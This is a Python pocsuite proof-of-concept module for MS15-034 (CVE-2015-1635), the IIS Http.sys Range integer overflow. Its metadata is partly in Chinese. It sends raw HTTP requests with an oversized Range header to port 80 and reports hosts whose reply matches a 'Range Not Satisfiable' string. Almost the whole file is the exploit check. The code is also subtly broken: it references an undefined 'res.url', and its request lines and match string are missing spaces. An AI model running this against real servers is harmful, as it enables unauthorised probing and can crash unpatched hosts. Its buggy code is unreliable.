#!/usr/bin/env python
# coding: utf-8

import socket
import random
from urlparse import urljoin
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from lib.utils.funs import url2ip


class TestPOC(POCBase):
    vulID = '89233'  # vul ID
    version = '1'
    author = ['cnyql']
    vulDate = '2015-04-14'
    createDate = '2015-04-16'
    updateDate = '2015-09-19'
    references = ['http://www.sebug.net/vuldb/ssvid-89233']
    name = 'IIS 系列 Http.sys 处理 Range 整数溢出漏洞'
    appPowerLink = 'http://www.iis.net/'
    appName = 'Miscrosoft IIS httpd'
    appVersion = 'N/A'
    vulType = 'Buffer Overflow'
    desc = '''
    2015年04月14日，微软发布严重级别的安全公告 MS15-034，编号为 CVE-2015-1635，据称在 Http.sys 中的漏洞可能允许远程执行代码。
    '''

    def _verify(self):

        ip = url2ip(self.url)
        hexAllFfff = "18446744073709551615"
        flag = False
        req1 = "GET /HTTP/1.0\r\n\r\n"
        req = "GET /HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"

        client_socket =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ip, 80))
        client_socket.send(req1)
        boringResp = client_socket.recv(1024)

        if "Microsoft" in boringResp:
            client_socket.close()
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip,80))
            client_socket.send(req)
            goodResp = client_socket.recv(1024)

            if "Requested RangeNot Satisfiable" in goodResp:
                flag = True

        return self.parse_verify(flag)

    def parse_verify(self, flag):
        output = Output(self)
        result = {}

        if flag:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = res.url
            output.success(result)
        
        else:
            output.fail('No vulnerability found.')

        return output
		
    def _attack(self):
        return self._verify()


register(TestPOC)
